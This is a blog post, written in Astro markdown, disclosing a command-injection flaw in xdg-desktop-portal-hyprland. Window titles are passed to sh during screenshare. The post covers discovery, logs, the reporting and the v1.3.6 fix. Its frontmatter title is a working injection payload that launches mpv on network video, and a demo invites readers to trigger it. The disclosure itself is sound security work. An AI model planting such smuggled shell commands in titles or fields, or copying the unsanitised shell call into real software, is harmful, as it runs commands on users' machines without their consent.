---
#title: "';$(mpv https://wavesmiley.com/wavesmiley.gif && echo exit) --loop=inf #"
#title: "';$(mpv https://youtu.be/X7RotIysnpo --loop=inf && echo exit) #"
title: "';$(mpv https://youtu.be/hTAiHiKNXr0 --loop=inf && echo exit) #"
description: "DESTROY xdph users with this one simple trick!"
pubDate: 1727547346000
image:
    url: https://mahiro.oyama.pictures/Doki
    alt: Mahiro Oyama's heart is beating
    isTopper: true
unlisted: true
---

import Demo from "./demo.astro"

Hey all.

I've been wasting a ton of time on Satisfactory ever since 1.0 released and kind of doing absolutely nothing else.
<small>I should really write *some* code again.</small>

As of writing, I'm on Tier 6, and in the middle of building a railway. I was, however, feeling reaaallly lonely, so I tried streaming to friends <small>(who didn't own Satisfactory nor even care to see me play)</small>, and... Vesktop just crashed.

Of course, my brain immediately shot to either my system or Vesktop being out of date. On my desktop, I use the Vesktop flatpak, so
I performed both a full system update <small>(which I had already just done, like, the day before)</small> and ran `flatpak update`.

Turns out Vesktop wasn't out of date. Whatever. Probably fixed now. So I tried again, and... Vesktop still crashed as soon as I dared click the screenshare button.

Cool! Alright. Time to mull over logs. :onimai.mihari.Tired:

Vesktop was complaining about not receiving a screen before crashing, and `strace` showed nothing, so I checked out `journalctl`, and saw...

```
xdg-desktop-portal-hyprland[22647]: sh: -c: line 1: syntax error near unexpected token `('
```

...an `sh` syntax error under `xdg-desktop-portal-hyprland`?

Weird. I read the triggering line, and figured that it was probably some Firefox window, so I closed the tabs of any Firefox window I had open with parentheses in the title, and got a different error:

```
xdg-desktop-portal-hyprland[23523]: sh: line 1: More: command not found
xdg-desktop-portal-hyprland[23525]: sh: line 1: Cloudflare: command not found
xdg-desktop-portal-hyprland[23524]: sh: line 1: Minecraft: command not found
xdg-desktop-portal-hyprland[23522]: sh: line 1: does: command not found
xdg-desktop-portal-hyprland[23526]: sh: line 1: coolviruses.download: command not found
```

Oh. Huh. Those are just... random select words from my browser's tabs.

Okay, so surely it wouldn't work if I just... *closed* Firefox, right?

...right?

...Nope. It worked without Firefox. I read the line triggering the syntax error again, and then decided to try something...

<p>
    <video src="/blog/hyprland-vulnerability/initialtest.mp4" controls alt="A video showing me with an open Firefox window titled a single quote and semicolon, followed by a shell command, and ended with a pound symbol. I click screenshare in a call on Vesktop, and a new file appears in a folder named demo, before Vesktop crashes." />
</p>

Oh! Okay! That... shouldn't happen!

At this point, I was still confused. I had assumed it was a Vesktop vulnerability, but I wasn't so sure. So I quickly decided to ask [Jack](https://jack.cab) if he could reproduce.

![me mentioning Jack on Discord with the previously shown video, asking him if he had the same issue](./jack_convo_1.png)

And he couldn't. Now we were even more confused. I was... kind of tired and lazy, so I got him to create a proper proof of concept to see whether it was was Vesktop or xdph.

<p>
    <video src="/blog/hyprland-vulnerability/poc1.mp4" controls alt="Proof of concept. A webpage with a button saying 'Hack me'. When clicked, Firefox prompts if you would like to give the page screenshare permissions, and when its request is accepted, mpv begins playing the 'windows sucks' video in fullscreen." />
</p>

Okay, so it's xdph. Cool!

At this point, we realized that we should probably report this, so we switched out mpv for a notification:

![Notification: Hello! Hello split from archdesktop!](./notification.png)

...and proceeded to send it to Vaxry to get fixed.

![Jack sends information regarding the bug to Vaxry](./jack_reports.png)

Anyway: 6 hours before the writing of this post, [xdph v1.3.6](https://github.com/hyprwm/xdg-desktop-portal-hyprland/releases/tag/v1.3.6) was released.
v1.3.6 contained commit [`dcfabff`](https://github.com/hyprwm/xdg-desktop-portal-hyprland/commit/dcfabff0fef78ecc0518748d4c25235ea1e63936), which fixed this vulnerability. I obviously heavily recommend that you update.

This vulnerability occurs because xdph's code only properly filters all characters after the first. The first character in a window's title is still filtered, but the code incorrectly filters out double quotes instead of single quotes.

**Extension to this blog post:** In xdph 1.3.2 and below, the problematic environment variable used double quotes instead of single quotes, which requires you to run commands using string interpolation instead of by ending the string. The title has been updated to accomodate for 1.3.2 and below.

## Demo

To cap it off, here's a demonstration:

<Demo />

<p style="text-align:center"><small>By the way, this demo uses `mpv` and its `yt-dlp` integration. Make sure to install both.</small></p>
<p style="text-align:center"><small>If you don't have JavaScript enabled, you should be able to keep this window open to this tab and screenshare almost anywhere else to trigger the demo ðŸ™ƒ</small></p>